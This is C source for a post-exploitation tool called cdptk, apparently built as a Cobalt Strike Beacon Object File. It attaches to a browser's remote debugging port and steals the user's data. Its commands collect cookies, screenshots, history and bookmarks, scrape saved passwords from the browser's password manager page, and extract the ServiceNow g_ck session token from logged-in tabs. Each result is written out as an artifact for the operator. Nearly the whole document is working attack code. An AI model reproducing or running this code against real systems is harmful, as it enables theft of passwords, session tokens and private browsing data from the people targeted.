static int build_history_deep_js(BUF* js, const char* query) {
  return buf_append(js, "(()=>{const q=", CDPTK_MAX_HTTP) &&
         buf_append_json_string(js, query ? query : "", CDPTK_MAX_HTTP) &&
         buf_append(js,
          ".toLowerCase(),seen=new Set(),roots=[],out=[],urls=new Set();"
          "function walk(n){if(!n||seen.has(n))return;seen.add(n);if(n.nodeType===Node.ELEMENT_NODE&&n.shadowRoot){roots.push(n.shadowRoot);walk(n.shadowRoot)}"
          "for(const c of(n.children?Array.from(n.children):[]))walk(c)}walk(document);roots.unshift(document);"
          "for(const r of roots){const lines=String(r.body?.innerText||r.host?.innerText||'').split(/\\n+/).map(x=>x.trim()).filter(Boolean);"
          "for(let i=0;i<lines.length&&out.length<100;i++){const u=lines[i];if(!/^(https?|file):\\/\\//i.test(u)||urls.has(u))continue;"
          "let t=i?lines[i-1]:'';if(!q&&t===u)t='';if(q&&!(t+' '+u).toLowerCase().includes(q))continue;urls.add(u);out.push({title:t,url:u})}}return out})()",
          CDPTK_MAX_HTTP);
}

static int evaluate(CDP* page, const char* expression, BUF* response) {
  BUF params = {0};
  int ok = buf_append(&params, "{\"expression\":", CDPTK_MAX_HTTP) &&
           buf_append_json_string(&params, expression, CDPTK_MAX_HTTP) &&
           buf_append(&params, ",\"returnByValue\":true,\"awaitPromise\":true,\"userGesture\":true}",
                      CDPTK_MAX_HTTP) &&
           cdp_send(page, "Runtime.evaluate", params.data, 0, response);
  buf_free(&params); return ok;
}

static int operation_servicenow_gck(INTERNET_PORT port, const char* selector) {
  const char* target_selector = selector && *selector ? selector : "service-now.com";
  TARGET target;
  bytes_zero(&target, sizeof(target));
  if (!resolve_target(port, target_selector, &target) || !target.ws[0]) {
    out_error("ServiceNow target not found");
    return 0;
  }
  const char* url_end = target.url + s_len(target.url);
  if (!s_contains_range(target.url, url_end, ".service-now.com/")) {
    out_error("target is not a service-now.com page");
    return 0;
  }
  CDP page;
  BUF response = {0};
  bytes_zero(&page, sizeof(page));
  if (!cdp_open(&page, port, target.ws)) {
    out_error("ServiceNow target WebSocket connection failed");
    return 0;
  }
  const char* expression =
      "(()=>{const v=globalThis.g_ck;return{url:location.href,origin:location.origin,"
      "g_ck:typeof v==='string'?v:''}})()";
  int ok = evaluate(&page, expression, &response) && !cdp_error(&response);
  if (ok && s_contains_range(response.data, response.data + response.len, "\"g_ck\":\"\"")) {
    out_error("window.g_ck was empty or unavailable");
    ok = 0;
  }
  if (ok) {
    ok = out_artifact("cdptk-servicenow-gck.json", (BYTE*)response.data, response.len);
  } else if (response.data && cdp_error(&response)) {
    out_text(response.data);
  } else if (!response.data) {
    out_error("ServiceNow g_ck evaluation failed");
  }
  buf_free(&response);
  cdp_close(&page);
  return ok;
}

static int operation_webui(INTERNET_PORT port, const char* kind, const char* query) {
  CDP browser, page; BUF version = {0}, create = {0}, params = {0}, response = {0};
  bytes_zero(&browser, sizeof(browser));
  bytes_zero(&page, sizeof(page));
  char product[256] = {0}, target_id[128] = {0};
  int edge = 0, ok = cdp_open_browser(&browser, port, &version);
  if (!ok) { out_error("browser WebSocket connection failed"); goto done; }
  json_get_string(version.data, "Browser", product, sizeof(product));
  edge = s_contains_range(product, product + s_len(product), "Edg/");
  const char* url = s_eq(kind, "bookmarks") ? (edge ? "edge://favorites/" : "chrome://bookmarks/") :
                    s_eq(kind, "history") ? (edge ? "edge://history/all" : "chrome://history/") :
                    s_eq(kind, "saved-passwords") ? (edge ? "edge://settings/autofill/passwords" : "chrome://password-manager/passwords") :
                    (edge ? "edge://extensions/" : "chrome://extensions/");
  ok = buf_append(&params, "{\"url\":", CDPTK_MAX_HTTP) &&
       buf_append_json_string(&params, url, CDPTK_MAX_HTTP) &&
       buf_append(&params, s_eq(kind, "saved-passwords") ? "}" : ",\"background\":true}", CDPTK_MAX_HTTP) &&
       cdp_send(&browser, "Target.createTarget", params.data, 0, &create) && !cdp_error(&create) &&
       json_get_string(create.data, "targetId", target_id, sizeof(target_id));
  if (!ok) { out_error("temporary WebUI target creation failed"); goto done; }
  TARGET target; bytes_zero(&target, sizeof(target));
  for (int i = 0; i < 30 && !target.ws[0]; i++) {
    BUF list = {0};
    if (get_target_list(port, &list)) select_target(list.data, target_id, &target);
    buf_free(&list);
    if (!target.ws[0]) KERNEL32$Sleep(200);
  }
  if (!target.ws[0] || !cdp_open(&page, port, target.ws)) { out_error("WebUI target attach failed"); ok = 0; goto cleanup_target; }
  BUF enabled = {0};
  cdp_send(&page, "Runtime.enable", "{}", 0, &enabled); buf_free(&enabled);
  cdp_send(&page, "Page.enable", "{}", 0, &enabled); buf_free(&enabled);
  KERNEL32$Sleep(s_eq(kind, "saved-passwords") ? 2500 : 1500);
  BUF dynamic_js = {0};
  const char* expression = s_eq(kind, "bookmarks") ? JS_BOOKMARKS :
                           s_eq(kind, "saved-passwords") ? JS_PASSWORDS :
                           s_eq(kind, "extensions") ? JS_EXTENSIONS : 0;
  if (s_eq(kind, "history")) { build_history_js(&dynamic_js, query); expression = dynamic_js.data; }
  ok = expression && evaluate(&page, expression, &response) && !cdp_error(&response);
  BUF fallback_js = {0};
  if (!ok || s_contains_range(response.data ? response.data : "", response.data ? response.data + response.len : "", "\"type\":\"undefined\"") ||
      s_contains_range(response.data ? response.data : "", response.data ? response.data + response.len : "", "exceptionDetails")) {
    buf_free(&response);
    const char* fallback = JS_DEEP_SCRAPE;
    if (s_eq(kind, "history") && build_history_deep_js(&fallback_js, query)) fallback = fallback_js.data;
    ok = evaluate(&page, fallback, &response) && !cdp_error(&response);
  }
  if (ok) {
    char name[64] = "cdptk-webui.json";
    if (s_eq(kind, "bookmarks")) bytes_copy(name, "cdptk-bookmarks.json", 21);
    else if (s_eq(kind, "history")) bytes_copy(name, "cdptk-history.json", 19);
    else if (s_eq(kind, "saved-passwords")) bytes_copy(name, "cdptk-saved-passwords.json", 27);
    else if (s_eq(kind, "extensions")) bytes_copy(name, "cdptk-extensions.json", 22);
    ok = out_artifact(name, (BYTE*)response.data, response.len);
  } else if (response.data) out_text(response.data); else out_error("WebUI collection failed");
  buf_free(&fallback_js); buf_free(&dynamic_js); buf_free(&response); cdp_close(&page);
cleanup_target:
  buf_free(&params); make_one_string_params(&params, "targetId", target_id);
  BUF close = {0}; cdp_send(&browser, "Target.closeTarget", params.data, 0, &close); buf_free(&close);
done:
  buf_free(&params); buf_free(&create); buf_free(&version); cdp_close(&browser); return ok;
}

static int dispatch(const char* command, INTERNET_PORT port, const char* arg1, const char* arg2,
                    int flags) {
  if (port < 1) port = 9222;
  if (s_eq(command, "discover")) return operation_discover(port);
  if (s_eq(command, "tabs")) return operation_tabs(port);
  if (s_eq(command, "screenshot")) return operation_screenshot(port, arg1, flags & 1);
  if (s_eq(command, "cookies")) return operation_cookies(port);
  if (s_eq(command, "page-new")) return operation_page_new(port, arg1, arg2);
  if (s_eq(command, "page-close")) return operation_page_close(port, arg1);
  if (s_eq(command, "contexts")) return operation_simple_browser(port, "Target.getBrowserContexts", "{}");
  if (s_eq(command, "context-dispose")) return operation_context_dispose(port, arg1);
  if (s_eq(command, "snapshot")) return operation_snapshot(port, arg1, arg2);
  if (s_eq(command, "extensions-load")) return operation_extensions_load(port, arg1, flags & 1);
  if (s_eq(command, "servicenow-gck")) return operation_servicenow_gck(port, arg1);
  if (s_eq(command, "bookmarks") || s_eq(command, "history") ||
      s_eq(command, "saved-passwords") || s_eq(command, "extensions"))
    return operation_webui(port, command, arg1);
  out_error("unknown command");
  return 0;
}

#ifdef BOF
static void copy_arg(char* dst, DWORD cap, char* src, int len) {
  DWORD n = len > 0 ? (DWORD)len : 0;
  if (n >= cap) n = cap - 1;
  if (n) bytes_copy(dst, src, n);
  dst[n] = 0;
}

void go(char* args, int alen) {
  datap parser;
  int n = 0;
  char command[64] = {0}, arg1[4096] = {0}, arg2[256] = {0};
  BeaconDataParse(&parser, args, alen);
  char* p = BeaconDataExtract(&parser, &n); copy_arg(command, sizeof(command), p, n);
  int port = BeaconDataInt(&parser);
  p = BeaconDataExtract(&parser, &n); copy_arg(arg1, sizeof(arg1), p, n);
  p = BeaconDataExtract(&parser, &n); copy_arg(arg2, sizeof(arg2), p, n);
  int flags = BeaconDataInt(&parser);
  if (!command[0]) { out_error("command required"); return; }
  dispatch(command, (INTERNET_PORT)port, arg1, arg2, flags);
}
#else
int main(int argc, char** argv) {
  if (argc < 2) {
    fprintf(stderr, "usage: cdptk-c <command> [port] [arg1] [arg2] [flags]\n");
    return 2;
  }
  int port = argc > 2 ? atoi(argv[2]) : 9222;
  const char* arg1 = argc > 3 ? argv[3] : "";
  const char* arg2 = argc > 4 ? argv[4] : "";
  int flags = argc > 5 ? atoi(argv[5]) : 0;
  return dispatch(argv[1], (INTERNET_PORT)port, arg1, arg2, flags) ? 0 : 1;
}
#endif
